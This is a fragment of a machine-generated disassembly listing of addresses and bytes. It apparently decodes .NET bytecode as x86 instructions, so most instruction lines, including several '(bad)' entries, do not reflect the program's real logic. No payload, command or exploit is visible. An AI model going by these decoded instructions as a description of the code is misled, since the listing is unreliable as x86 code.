  40426d:	11 08                	adc    %ecx,(%eax)
  40426f:	7d 59                	jge    0x4042ca
  404271:	00 00                	add    %al,(%eax)
  404273:	04 02                	add    $0x2,%al
  404275:	7c 51                	jl     0x4042c8
  404277:	00 00                	add    %al,(%eax)
  404279:	04 12                	add    $0x12,%al
  40427b:	08 02                	or     %al,(%edx)
  40427d:	28 29                	sub    %ch,(%ecx)
  40427f:	00 00                	add    %al,(%eax)
  404281:	2b dd                	sub    %ebp,%ebx
  404283:	bf 01 00 00 02       	mov    $0x2000001,%edi
  404288:	7b 59                	jnp    0x4042e3
  40428a:	00 00                	add    %al,(%eax)
  40428c:	04 13                	add    $0x13,%al
  40428e:	08 02                	or     %al,(%edx)
  404290:	7c 59                	jl     0x4042eb
  404292:	00 00                	add    %al,(%eax)
  404294:	04 fe                	add    $0xfe,%al
  404296:	15 08 00 00 1b       	adc    $0x1b000008,%eax
  40429b:	02 15 25 0a 7d 50    	add    0x507d0a25,%dl
  4042a1:	00 00                	add    %al,(%eax)
  4042a3:	04 12                	add    $0x12,%al
  4042a5:	08 28                	or     %ch,(%eax)
  4042a7:	50                   	push   %eax
  4042a8:	00 00                	add    %al,(%eax)
  4042aa:	0a 13                	or     (%ebx),%dl
  4042ac:	07                   	pop    %es
  4042ad:	02 11                	add    (%ecx),%dl
  4042af:	07                   	pop    %es
  4042b0:	7d 57                	jge    0x404309
  4042b2:	00 00                	add    %al,(%eax)
  4042b4:	04 17                	add    $0x17,%al
  4042b6:	8d 2e                	lea    (%esi),%ebp
  4042b8:	00 00                	add    %al,(%eax)
  4042ba:	01 25 16 02 7b 55    	add    %esp,0x557b0216
  4042c0:	00 00                	add    %al,(%eax)
  4042c2:	04 d2                	add    $0xd2,%al
  4042c4:	9c                   	pushf
  4042c5:	13 04 02             	adc    (%edx,%eax,1),%eax
  4042c8:	7b 57                	jnp    0x404321
  4042ca:	00 00                	add    %al,(%eax)
  4042cc:	04 11                	add    $0x11,%al
  4042ce:	04 6f                	add    $0x6f,%al
  4042d0:	32 00                	xor    (%eax),%al
  4042d2:	00 06                	add    %al,(%esi)
  4042d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4042d5:	2b 00                	sub    (%eax),%eax
  4042d7:	00 0a                	add    %cl,(%edx)
  4042d9:	13 09                	adc    (%ecx),%ecx
  4042db:	12 09                	adc    (%ecx),%cl
  4042dd:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4042e0:	00 0a                	add    %cl,(%edx)
  4042e2:	2d 41 02 18 25       	sub    $0x25180241,%eax
  4042e7:	0a 7d 50             	or     0x50(%ebp),%bh
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	04 02                	add    $0x2,%al
  4042ee:	11 09                	adc    %ecx,(%ecx)
  4042f0:	7d 5a                	jge    0x40434c
  4042f2:	00 00                	add    %al,(%eax)
  4042f4:	04 02                	add    $0x2,%al
  4042f6:	7c 51                	jl     0x404349
  4042f8:	00 00                	add    %al,(%eax)
  4042fa:	04 12                	add    $0x12,%al
  4042fc:	09 02                	or     %eax,(%edx)
  4042fe:	28 2a                	sub    %ch,(%edx)
  404300:	00 00                	add    %al,(%eax)
  404302:	2b dd                	sub    %ebp,%ebx
  404304:	3e 01 00             	add    %eax,%ds:(%eax)
  404307:	00 02                	add    %al,(%edx)
  404309:	7b 5a                	jnp    0x404365
  40430b:	00 00                	add    %al,(%eax)
  40430d:	04 13                	add    $0x13,%al
  40430f:	09 02                	or     %eax,(%edx)
  404311:	7c 5a                	jl     0x40436d
  404313:	00 00                	add    %al,(%eax)
  404315:	04 fe                	add    $0xfe,%al
  404317:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40431c:	02 15 25 0a 7d 50    	add    0x507d0a25,%dl
  404322:	00 00                	add    %al,(%eax)
  404324:	04 12                	add    $0x12,%al
  404326:	09 28                	or     %ebp,(%eax)
  404328:	2d 00 00 0a 26       	sub    $0x260a0000,%eax
  40432d:	17                   	pop    %ss
  40432e:	8d 2e                	lea    (%esi),%ebp
  404330:	00 00                	add    %al,(%eax)
  404332:	01 25 16 17 9c 13    	add    %esp,0x139c1716
  404338:	05 07 11 05 28       	add    $0x28051107,%eax
  40433d:	32 00                	xor    (%eax),%al
  40433f:	00 06                	add    %al,(%esi)
  404341:	6f                   	outsl  %ds:(%esi),(%dx)
  404342:	2b 00                	sub    (%eax),%eax
  404344:	00 0a                	add    %cl,(%edx)
  404346:	13 09                	adc    (%ecx),%ecx
  404348:	12 09                	adc    (%ecx),%cl
  40434a:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40434d:	00 0a                	add    %cl,(%edx)
  40434f:	2d 41 02 19 25       	sub    $0x25190241,%eax
  404354:	0a 7d 50             	or     0x50(%ebp),%bh
  404357:	00 00                	add    %al,(%eax)
  404359:	04 02                	add    $0x2,%al
  40435b:	11 09                	adc    %ecx,(%ecx)
  40435d:	7d 5a                	jge    0x4043b9
  40435f:	00 00                	add    %al,(%eax)
  404361:	04 02                	add    $0x2,%al
  404363:	7c 51                	jl     0x4043b6
  404365:	00 00                	add    %al,(%eax)
  404367:	04 12                	add    $0x12,%al
  404369:	09 02                	or     %eax,(%edx)
  40436b:	28 2a                	sub    %ch,(%edx)
  40436d:	00 00                	add    %al,(%eax)
  40436f:	2b dd                	sub    %ebp,%ebx
  404371:	d1 00                	roll   $1,(%eax)
  404373:	00 00                	add    %al,(%eax)
  404375:	02 7b 5a             	add    0x5a(%ebx),%bh
  404378:	00 00                	add    %al,(%eax)
  40437a:	04 13                	add    $0x13,%al
  40437c:	09 02                	or     %eax,(%edx)
  40437e:	7c 5a                	jl     0x4043da
  404380:	00 00                	add    %al,(%eax)
  404382:	04 fe                	add    $0xfe,%al
  404384:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  404389:	02 15 25 0a 7d 50    	add    0x507d0a25,%dl
  40438f:	00 00                	add    %al,(%eax)
  404391:	04 12                	add    $0x12,%al
  404393:	09 28                	or     %ebp,(%eax)
  404395:	2d 00 00 0a 26       	sub    $0x260a0000,%eax
  40439a:	02 7b 57             	add    0x57(%ebx),%bh
  40439d:	00 00                	add    %al,(%eax)
  40439f:	04 0c                	add    $0xc,%al
  4043a1:	dd 8c 00 00 00 26 17 	fisttpll 0x17260000(%eax,%eax,1)
  4043a8:	0d de 00 09 17       	or     $0x170900de,%eax
  4043ad:	33 68 17             	xor    0x17(%eax),%ebp
  4043b0:	8d 2e                	lea    (%esi),%ebp
  4043b2:	00 00                	add    %al,(%eax)
  4043b4:	01 13                	add    %edx,(%ebx)
  4043b6:	0a 07                	or     (%edi),%al
  4043b8:	11 0a                	adc    %ecx,(%edx)
  4043ba:	28 32                	sub    %dh,(%edx)
  4043bc:	00 00                	add    %al,(%eax)
  4043be:	06                   	push   %es
  4043bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4043c0:	2b 00                	sub    (%eax),%eax
  4043c2:	00 0a                	add    %cl,(%edx)
  4043c4:	13 09                	adc    (%ecx),%ecx
  4043c6:	12 09                	adc    (%ecx),%cl
  4043c8:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4043cb:	00 0a                	add    %cl,(%edx)
  4043cd:	2d 3e 02 1a 25       	sub    $0x251a023e,%eax
  4043d2:	0a 7d 50             	or     0x50(%ebp),%bh
  4043d5:	00 00                	add    %al,(%eax)
  4043d7:	04 02                	add    $0x2,%al
  4043d9:	11 09                	adc    %ecx,(%ecx)
  4043db:	7d 5a                	jge    0x404437
  4043dd:	00 00                	add    %al,(%eax)
  4043df:	04 02                	add    $0x2,%al
  4043e1:	7c 51                	jl     0x404434
  4043e3:	00 00                	add    %al,(%eax)
  4043e5:	04 12                	add    $0x12,%al
  4043e7:	09 02                	or     %eax,(%edx)
  4043e9:	28 2a                	sub    %ch,(%edx)
  4043eb:	00 00                	add    %al,(%eax)
  4043ed:	2b de                	sub    %esi,%ebx
  4043ef:	56                   	push   %esi
  4043f0:	02 7b 5a             	add    0x5a(%ebx),%bh
  4043f3:	00 00                	add    %al,(%eax)
  4043f5:	04 13                	add    $0x13,%al
  4043f7:	09 02                	or     %eax,(%edx)
  4043f9:	7c 5a                	jl     0x404455
  4043fb:	00 00                	add    %al,(%eax)
  4043fd:	04 fe                	add    $0xfe,%al
  4043ff:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  404404:	02 15 25 0a 7d 50    	add    0x507d0a25,%dl
  40440a:	00 00                	add    %al,(%eax)
  40440c:	04 12                	add    $0x12,%al
  40440e:	09 28                	or     %ebp,(%eax)
  404410:	2d 00 00 0a 26       	sub    $0x260a0000,%eax
  404415:	14 0c                	adc    $0xc,%al
  404417:	de 19                	ficomps (%ecx)
  404419:	13 0b                	adc    (%ebx),%ecx
  40441b:	02 1f                	add    (%edi),%bl
  40441d:	fe                   	(bad)
  40441e:	7d 50                	jge    0x404470
  404420:	00 00                	add    %al,(%eax)
  404422:	04 02                	add    $0x2,%al
  404424:	7c 51                	jl     0x404477
  404426:	00 00                	add    %al,(%eax)
  404428:	04 11                	add    $0x11,%al
  40442a:	0b 28                	or     (%eax),%ebp
  40442c:	90                   	nop
  40442d:	00 00                	add    %al,(%eax)
  40442f:	0a de                	or     %dh,%bl
  404431:	14 02                	adc    $0x2,%al
  404433:	1f                   	pop    %ds
  404434:	fe                   	(bad)
  404435:	7d 50                	jge    0x404487
  404437:	00 00                	add    %al,(%eax)
  404439:	04 02                	add    $0x2,%al
  40443b:	7c 51                	jl     0x40448e
  40443d:	00 00                	add    %al,(%eax)
  40443f:	04 08                	add    $0x8,%al
  404441:	28 91 00 00 0a 2a    	sub    %dl,0x2a0a0000(%ecx)
  404447:	00 41 34             	add    %al,0x34(%ecx)
  40444a:	00 00                	add    %al,(%eax)
  40444c:	00 00                	add    %al,(%eax)
  40444e:	00 00                	add    %al,(%eax)
  404450:	1c 00                	sbb    $0x0,%al
  404452:	00 00                	add    %al,(%eax)
  404454:	12 02                	adc    (%edx),%al
  404456:	00 00                	add    %al,(%eax)
  404458:	2e 02 00             	add    %cs:(%eax),%al
  40445b:	00 05 00 00 00 01    	add    %al,0x1000000
  404461:	00 00                	add    %al,(%eax)
  404463:	01 00                	add    %eax,(%eax)
  404465:	00 00                	add    %al,(%eax)
  404467:	00 0e                	add    %cl,(%esi)
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 93 02 00 00 a1    	add    %dl,-0x5efffffe(%ebx)
  404471:	02 00                	add    (%eax),%al
  404473:	00 19                	add    %bl,(%ecx)
  404475:	00 00                	add    %al,(%eax)
  404477:	00 0b                	add    %cl,(%ebx)
  404479:	00 00                	add    %al,(%eax)
  40447b:	01 1b                	add    %ebx,(%ebx)
  40447d:	30 03                	xor    %al,(%ebx)
  40447f:	00 b1 00 00 00 1d    	add    %dh,0x1d000000(%ecx)
  404485:	00 00                	add    %al,(%eax)
  404487:	11 02                	adc    %eax,(%edx)
  404489:	7b 5b                	jnp    0x4044e6
  40448b:	00 00                	add    %al,(%eax)
  40448d:	04 0a                	add    $0xa,%al
  40448f:	02 7b 5d             	add    0x5d(%ebx),%bh
  404492:	00 00                	add    %al,(%eax)
  404494:	04 0b                	add    $0xb,%al
  404496:	06                   	push   %es
  404497:	2c 3c                	sub    $0x3c,%al
  404499:	07                   	pop    %es
  40449a:	7b 47                	jnp    0x4044e3
  40449c:	00 00                	add    %al,(%eax)
  40449e:	04 6f                	add    $0x6f,%al
  4044a0:	49                   	dec    %ecx
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	06                   	push   %es
  4044a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044a5:	23 00                	and    (%eax),%eax
  4044a7:	00 0a                	add    %cl,(%edx)
  4044a9:	13 04 12             	adc    (%edx,%edx,1),%eax
  4044ac:	04 28                	add    $0x28,%al
  4044ae:	24 00                	and    $0x0,%al
  4044b0:	00 0a                	add    %cl,(%edx)
  4044b2:	2d 3e 02 16 25       	sub    $0x2516023e,%eax
  4044b7:	0a 7d 5b             	or     0x5b(%ebp),%bh
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	04 02                	add    $0x2,%al
  4044be:	11 04 7d 5e 00 00 04 	adc    %eax,0x400005e(,%edi,2)
  4044c5:	02 7c 5c 00          	add    0x0(%esp,%ebx,2),%bh
  4044c9:	00 04 12             	add    %al,(%edx,%edx,1)
  4044cc:	04 02                	add    $0x2,%al
  4044ce:	28 2b                	sub    %ch,(%ebx)
  4044d0:	00 00                	add    %al,(%eax)
  4044d2:	2b de                	sub    %esi,%ebx
  4044d4:	63 02                	arpl   %eax,(%edx)
  4044d6:	7b 5e                	jnp    0x404536
  4044d8:	00 00                	add    %al,(%eax)
  4044da:	04 13                	add    $0x13,%al
  4044dc:	04 02                	add    $0x2,%al
  4044de:	7c 5e                	jl     0x40453e
  4044e0:	00 00                	add    %al,(%eax)
  4044e2:	04 fe                	add    $0xfe,%al
  4044e4:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4044e9:	02 15 25 0a 7d 5b    	add    0x5b7d0a25,%dl
  4044ef:	00 00                	add    %al,(%eax)
  4044f1:	04 12                	add    $0x12,%al
  4044f3:	04 28                	add    $0x28,%al
  4044f5:	26 00 00             	add    %al,%es:(%eax)
  4044f8:	0a 0d 09 2d 0a 07    	or     0x70a2d09,%cl
  4044fe:	28 2e                	sub    %ch,(%esi)
  404500:	00 00                	add    %al,(%eax)
  404502:	06                   	push   %es
  404503:	14 0c                	adc    $0xc,%al
  404505:	de 1d 09 0c de 19    	ficomps 0x19de0c09
  40450b:	13 05 02 1f fe 7d    	adc    0x7dfe1f02,%eax
  404511:	5b                   	pop    %ebx
  404512:	00 00                	add    %al,(%eax)
  404514:	04 02                	add    $0x2,%al
  404516:	7c 5c                	jl     0x404574
  404518:	00 00                	add    %al,(%eax)
  40451a:	04 11                	add    $0x11,%al
  40451c:	05 28 94 00 00       	add    $0x9428,%eax
  404521:	0a de                	or     %dh,%bl
  404523:	14 02                	adc    $0x2,%al
  404525:	1f                   	pop    %ds
  404526:	fe                   	(bad)
  404527:	7d 5b                	jge    0x404584
  404529:	00 00                	add    %al,(%eax)
  40452b:	04 02                	add    $0x2,%al
  40452d:	7c 5c                	jl     0x40458b
  40452f:	00 00                	add    %al,(%eax)
  404531:	04 08                	add    $0x8,%al
  404533:	28 95 00 00 0a 2a    	sub    %dl,0x2a0a0000(%ebp)
  404539:	00 00                	add    %al,(%eax)
  40453b:	00 01                	add    %al,(%ecx)
  40453d:	10 00                	adc    %al,(%eax)
  40453f:	00 00                	add    %al,(%eax)
  404541:	00 0e                	add    %cl,(%esi)
  404543:	00 75 83             	add    %dh,-0x7d(%ebp)
  404546:	00 19                	add    %bl,(%ecx)
  404548:	0b 00                	or     (%eax),%eax
  40454a:	00 01                	add    %al,(%ecx)
  40454c:	1b 30                	sbb    (%eax),%esi
  40454e:	03 00                	add    (%eax),%eax
  404550:	b2 00                	mov    $0x0,%dl
  404552:	00 00                	add    %al,(%eax)
  404554:	1e                   	push   %ds
  404555:	00 00                	add    %al,(%eax)
  404557:	11 02                	adc    %eax,(%edx)
  404559:	7b 5f                	jnp    0x4045ba
  40455b:	00 00                	add    %al,(%eax)
  40455d:	04 0a                	add    $0xa,%al
  40455f:	02 7b 61             	add    0x61(%ebx),%bh
  404562:	00 00                	add    %al,(%eax)
  404564:	04 0b                	add    $0xb,%al
  404566:	06                   	push   %es
  404567:	2c 40                	sub    $0x40,%al
  404569:	07                   	pop    %es
  40456a:	7b 47                	jnp    0x4045b3
  40456c:	00 00                	add    %al,(%eax)
  40456e:	04 02                	add    $0x2,%al
  404570:	7b 62                	jnp    0x4045d4
  404572:	00 00                	add    %al,(%eax)
  404574:	04 6f                	add    $0x6f,%al
  404576:	48                   	dec    %eax
  404577:	00 00                	add    %al,(%eax)
  404579:	06                   	push   %es
  40457a:	6f                   	outsl  %ds:(%esi),(%dx)
  40457b:	2b 00                	sub    (%eax),%eax
  40457d:	00 0a                	add    %cl,(%edx)
  40457f:	0d 12 03 28 2c       	or     $0x2c280312,%eax
  404584:	00 00                	add    %al,(%eax)
  404586:	0a 2d 3c 02 16 25    	or     0x2516023c,%ch
  40458c:	0a 7d 5f             	or     0x5f(%ebp),%bh
  40458f:	00 00                	add    %al,(%eax)
  404591:	04 02                	add    $0x2,%al
  404593:	09 7d 63             	or     %edi,0x63(%ebp)
  404596:	00 00                	add    %al,(%eax)
  404598:	04 02                	add    $0x2,%al
  40459a:	7c 60                	jl     0x4045fc
  40459c:	00 00                	add    %al,(%eax)
  40459e:	04 12                	add    $0x12,%al
  4045a0:	03 02                	add    (%edx),%eax
  4045a2:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4045a5:	00 2b                	add    %ch,(%ebx)
  4045a7:	de 60 02             	fisubs 0x2(%eax)
  4045aa:	7b 63                	jnp    0x40460f
  4045ac:	00 00                	add    %al,(%eax)
  4045ae:	04 0d                	add    $0xd,%al
  4045b0:	02 7c 63 00          	add    0x0(%ebx,%eiz,2),%bh
  4045b4:	00 04 fe             	add    %al,(%esi,%edi,8)
  4045b7:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  4045bc:	02 15 25 0a 7d 5f    	add    0x5f7d0a25,%dl
  4045c2:	00 00                	add    %al,(%eax)
  4045c4:	04 12                	add    $0x12,%al
  4045c6:	03 28                	add    (%eax),%ebp
  4045c8:	2d 00 00 0a 2d       	sub    $0x2d0a0000,%eax
  4045cd:	0a 07                	or     (%edi),%al
  4045cf:	28 2e                	sub    %ch,(%esi)
  4045d1:	00 00                	add    %al,(%eax)
  4045d3:	06                   	push   %es
  4045d4:	16                   	push   %ss
  4045d5:	0c de                	or     $0xde,%al
  4045d7:	1d 17 0c de 19       	sbb    $0x19de0c17,%eax
  4045dc:	13 04 02             	adc    (%edx,%eax,1),%eax
  4045df:	1f                   	pop    %ds
  4045e0:	fe                   	(bad)
  4045e1:	7d 5f                	jge    0x404642
  4045e3:	00 00                	add    %al,(%eax)
  4045e5:	04 02                	add    $0x2,%al
  4045e7:	7c 60                	jl     0x404649
  4045e9:	00 00                	add    %al,(%eax)
  4045eb:	04 11                	add    $0x11,%al
  4045ed:	04 28                	add    $0x28,%al
  4045ef:	98                   	cwtl
  4045f0:	00 00                	add    %al,(%eax)
  4045f2:	0a de                	or     %dh,%bl
  4045f4:	14 02                	adc    $0x2,%al
  4045f6:	1f                   	pop    %ds
  4045f7:	fe                   	(bad)
  4045f8:	7d 5f                	jge    0x404659
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	04 02                	add    $0x2,%al
  4045fe:	7c 60                	jl     0x404660
  404600:	00 00                	add    %al,(%eax)
  404602:	04 08                	add    $0x8,%al
  404604:	28 99 00 00 0a 2a    	sub    %bl,0x2a0a0000(%ecx)
  40460a:	00 00                	add    %al,(%eax)
  40460c:	01 10                	add    %edx,(%eax)
  40460e:	00 00                	add    %al,(%eax)
  404610:	00 00                	add    %al,(%eax)
  404612:	0e                   	push   %cs
  404613:	00 76 84             	add    %dh,-0x7c(%esi)
  404616:	00 19                	add    %bl,(%ecx)
  404618:	0b 00                	or     (%eax),%eax
  40461a:	00 01                	add    %al,(%ecx)
  40461c:	1b 30                	sbb    (%eax),%esi
  40461e:	04 00                	add    $0x0,%al
  404620:	92                   	xchg   %eax,%edx
  404621:	03 00                	add    (%eax),%eax
  404623:	00 1f                	add    %bl,(%edi)
  404625:	00 00                	add    %al,(%eax)
  404627:	11 02                	adc    %eax,(%edx)
  404629:	7b 64                	jnp    0x40468f
  40462b:	00 00                	add    %al,(%eax)
  40462d:	04 0a                	add    $0xa,%al
  40462f:	02 7b 66             	add    0x66(%ebx),%bh
  404632:	00 00                	add    %al,(%eax)
  404634:	04 0b                	add    $0xb,%al
  404636:	06                   	push   %es
  404637:	1b 36                	sbb    (%esi),%esi
  404639:	17                   	pop    %ss
  40463a:	02 1d 8d 2e 00 00    	add    0x2e8d,%bl
  404640:	01 25 d0 cf 00 00    	add    %esp,0xcfd0
  404646:	04 28                	add    $0x28,%al
  404648:	9b                   	fwait
  404649:	00 00                	add    %al,(%eax)
  40464b:	0a 7d 69             	or     0x69(%ebp),%bh
  40464e:	00 00                	add    %al,(%eax)
  404650:	04 00                	add    $0x0,%al
  404652:	06                   	push   %es
  404653:	45                   	inc    %ebp
  404654:	06                   	push   %es
  404655:	00 00                	add    %al,(%eax)
  404657:	00 4f 00             	add    %cl,0x0(%edi)
  40465a:	00 00                	add    %al,(%eax)
  40465c:	b4 00                	mov    $0x0,%ah
  40465e:	00 00                	add    %al,(%eax)
  404660:	20 01                	and    %al,(%ecx)
  404662:	00 00                	add    %al,(%eax)
  404664:	b6 01                	mov    $0x1,%dh
  404666:	00 00                	add    %al,(%eax)
  404668:	2d 02 00 00 cb       	sub    $0xcb000002,%eax
  40466d:	02 00                	add    (%eax),%al
  40466f:	00 07                	add    %al,(%edi)
  404671:	7b 47                	jnp    0x4046ba
  404673:	00 00                	add    %al,(%eax)
  404675:	04 20                	add    $0x20,%al
  404677:	88 13                	mov    %dl,(%ebx)
  404679:	00 00                	add    %al,(%eax)
  40467b:	6f                   	outsl  %ds:(%esi),(%dx)
  40467c:	4c                   	dec    %esp
  40467d:	00 00                	add    %al,(%eax)
  40467f:	06                   	push   %es
  404680:	07                   	pop    %es
  404681:	7b 47                	jnp    0x4046ca
  404683:	00 00                	add    %al,(%eax)
  404685:	04 6f                	add    $0x6f,%al
  404687:	49                   	dec    %ecx
  404688:	00 00                	add    %al,(%eax)
  40468a:	06                   	push   %es
  40468b:	6f                   	outsl  %ds:(%esi),(%dx)
  40468c:	23 00                	and    (%eax),%eax
  40468e:	00 0a                	add    %cl,(%edx)
  404690:	13 04 12             	adc    (%edx,%edx,1),%eax
  404693:	04 28                	add    $0x28,%al
  404695:	24 00                	and    $0x0,%al
  404697:	00 0a                	add    %cl,(%edx)
  404699:	2d 41 02 16 25       	sub    $0x25160241,%eax
  40469e:	0a 7d 64             	or     0x64(%ebp),%bh
  4046a1:	00 00                	add    %al,(%eax)
  4046a3:	04 02                	add    $0x2,%al
  4046a5:	11 04 7d 6a 00 00 04 	adc    %eax,0x400006a(,%edi,2)
  4046ac:	02 7c 65 00          	add    0x0(%ebp,%eiz,2),%bh
  4046b0:	00 04 12             	add    %al,(%edx,%edx,1)
  4046b3:	04 02                	add    $0x2,%al
  4046b5:	28 2d 00 00 2b dd    	sub    %ch,0xdd2b0000
  4046bb:	fa                   	cli
  4046bc:	02 00                	add    (%eax),%al
  4046be:	00 02                	add    %al,(%edx)
  4046c0:	7b 6a                	jnp    0x40472c
  4046c2:	00 00                	add    %al,(%eax)
  4046c4:	04 13                	add    $0x13,%al
  4046c6:	04 02                	add    $0x2,%al
  4046c8:	7c 6a                	jl     0x404734
  4046ca:	00 00                	add    %al,(%eax)
  4046cc:	04 fe                	add    $0xfe,%al
  4046ce:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4046d3:	02 15 25 0a 7d 64    	add    0x647d0a25,%dl
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	04 12                	add    $0x12,%al
  4046dd:	04 28                	add    $0x28,%al
  4046df:	26 00 00             	add    %al,%es:(%eax)
  4046e2:	0a 0d 07 7b 47 00    	or     0x477b07,%cl
  4046e8:	00 04 09             	add    %al,(%ecx,%ecx,1)
  4046eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ec:	48                   	dec    %eax
  4046ed:	00 00                	add    %al,(%eax)
  4046ef:	06                   	push   %es
  4046f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4046f1:	2b 00                	sub    (%eax),%eax
  4046f3:	00 0a                	add    %cl,(%edx)
  4046f5:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  4046fb:	00 00                	add    %al,(%eax)
  4046fd:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  404703:	0a 7d 64             	or     0x64(%ebp),%bh
  404706:	00 00                	add    %al,(%eax)
  404708:	04 02                	add    $0x2,%al
  40470a:	11 05 7d 6b 00 00    	adc    %eax,0x6b7d
  404710:	04 02                	add    $0x2,%al
  404712:	7c 65                	jl     0x404779
  404714:	00 00                	add    %al,(%eax)
  404716:	04 12                	add    $0x12,%al
  404718:	05 02 28 2e 00       	add    $0x2e2802,%eax
  40471d:	00 2b                	add    %ch,(%ebx)
  40471f:	dd 95 02 00 00 02    	fstl   0x2000002(%ebp)
  404725:	7b 6b                	jnp    0x404792
  404727:	00 00                	add    %al,(%eax)
  404729:	04 13                	add    $0x13,%al
  40472b:	05 02 7c 6b 00       	add    $0x6b7c02,%eax
  404730:	00 04 fe             	add    %al,(%esi,%edi,8)
  404733:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  404738:	02 15 25 0a 7d 64    	add    0x647d0a25,%dl
  40473e:	00 00                	add    %al,(%eax)
  404740:	04 12                	add    $0x12,%al
  404742:	05 28 2d 00 00       	add    $0x2d28,%eax
  404747:	0a 2d 07 16 0c dd    	or     0xdd0c1607,%ch
  40474d:	4d                   	dec    %ebp
  40474e:	02 00                	add    (%eax),%al
  404750:	00 07                	add    %al,(%edi)
  404752:	7b 47                	jnp    0x40479b
  404754:	00 00                	add    %al,(%eax)
  404756:	04 6f                	add    $0x6f,%al
  404758:	49                   	dec    %ecx
  404759:	00 00                	add    %al,(%eax)
  40475b:	06                   	push   %es
  40475c:	6f                   	outsl  %ds:(%esi),(%dx)
  40475d:	23 00                	and    (%eax),%eax
  40475f:	00 0a                	add    %cl,(%edx)
  404761:	13 04 12             	adc    (%edx,%edx,1),%eax
  404764:	04 28                	add    $0x28,%al
  404766:	24 00                	and    $0x0,%al
  404768:	00 0a                	add    %cl,(%edx)
  40476a:	2d 41 02 18 25       	sub    $0x25180241,%eax
  40476f:	0a 7d 64             	or     0x64(%ebp),%bh
  404772:	00 00                	add    %al,(%eax)
  404774:	04 02                	add    $0x2,%al
  404776:	11 04 7d 6a 00 00 04 	adc    %eax,0x400006a(,%edi,2)
  40477d:	02 7c 65 00          	add    0x0(%ebp,%eiz,2),%bh
  404781:	00 04 12             	add    %al,(%edx,%edx,1)
  404784:	04 02                	add    $0x2,%al
  404786:	28 2d 00 00 2b dd    	sub    %ch,0xdd2b0000
  40478c:	29 02                	sub    %eax,(%edx)
  40478e:	00 00                	add    %al,(%eax)
  404790:	02 7b 6a             	add    0x6a(%ebx),%bh
  404793:	00 00                	add    %al,(%eax)
  404795:	04 13                	add    $0x13,%al
  404797:	04 02                	add    $0x2,%al
  404799:	7c 6a                	jl     0x404805
  40479b:	00 00                	add    %al,(%eax)
  40479d:	04 fe                	add    $0xfe,%al
  40479f:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4047a4:	02 15 25 0a 7d 64    	add    0x647d0a25,%dl
  4047aa:	00 00                	add    %al,(%eax)
  4047ac:	04 12                	add    $0x12,%al
  4047ae:	04 28                	add    $0x28,%al
  4047b0:	26 00 00             	add    %al,%es:(%eax)
  4047b3:	0a 0d 07 7b 47 00    	or     0x477b07,%cl
  4047b9:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4047bc:	4d                   	dec    %ebp
  4047bd:	00 00                	add    %al,(%eax)
  4047bf:	06                   	push   %es
  4047c0:	07                   	pop    %es
  4047c1:	02 7b 69             	add    0x69(%ebx),%bh
  4047c4:	00 00                	add    %al,(%eax)
  4047c6:	04 09                	add    $0x9,%al
  4047c8:	28 33                	sub    %dh,(%ebx)
  4047ca:	00 00                	add    %al,(%eax)
  4047cc:	06                   	push   %es
  4047cd:	39 a3 01 00 00 07    	cmp    %esp,0x7000001(%ebx)
  4047d3:	7b 47                	jnp    0x40481c
  4047d5:	00 00                	add    %al,(%eax)
  4047d7:	04 02                	add    $0x2,%al
  4047d9:	7b 67                	jnp    0x404842
  4047db:	00 00                	add    %al,(%eax)
  4047dd:	04 6f                	add    $0x6f,%al
  4047df:	4b                   	dec    %ebx
  4047e0:	00 00                	add    %al,(%eax)
  4047e2:	06                   	push   %es
  4047e3:	13 06                	adc    (%esi),%eax
  4047e5:	07                   	pop    %es
  4047e6:	7b 47                	jnp    0x40482f
  4047e8:	00 00                	add    %al,(%eax)
  4047ea:	04 11                	add    $0x11,%al
  4047ec:	06                   	push   %es
  4047ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4047ee:	48                   	dec    %eax
  4047ef:	00 00                	add    %al,(%eax)
  4047f1:	06                   	push   %es
  4047f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4047f3:	2b 00                	sub    (%eax),%eax
  4047f5:	00 0a                	add    %cl,(%edx)
  4047f7:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  4047fd:	00 00                	add    %al,(%eax)
  4047ff:	0a 2d 41 02 19 25    	or     0x25190241,%ch
  404805:	0a 7d 64             	or     0x64(%ebp),%bh
  404808:	00 00                	add    %al,(%eax)
  40480a:	04 02                	add    $0x2,%al
  40480c:	11 05 7d 6b 00 00    	adc    %eax,0x6b7d
  404812:	04 02                	add    $0x2,%al
  404814:	7c 65                	jl     0x40487b
  404816:	00 00                	add    %al,(%eax)
  404818:	04 12                	add    $0x12,%al
  40481a:	05 02 28 2e 00       	add    $0x2e2802,%eax
  40481f:	00 2b                	add    %ch,(%ebx)
  404821:	dd 93 01 00 00 02    	fstl   0x2000001(%ebx)
  404827:	7b 6b                	jnp    0x404894
  404829:	00 00                	add    %al,(%eax)
  40482b:	04 13                	add    $0x13,%al
  40482d:	05 02 7c 6b 00       	add    $0x6b7c02,%eax
  404832:	00 04 fe             	add    %al,(%esi,%edi,8)
  404835:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40483a:	02 15 25 0a 7d 64    	add    0x647d0a25,%dl
  404840:	00 00                	add    %al,(%eax)
  404842:	04 12                	add    $0x12,%al
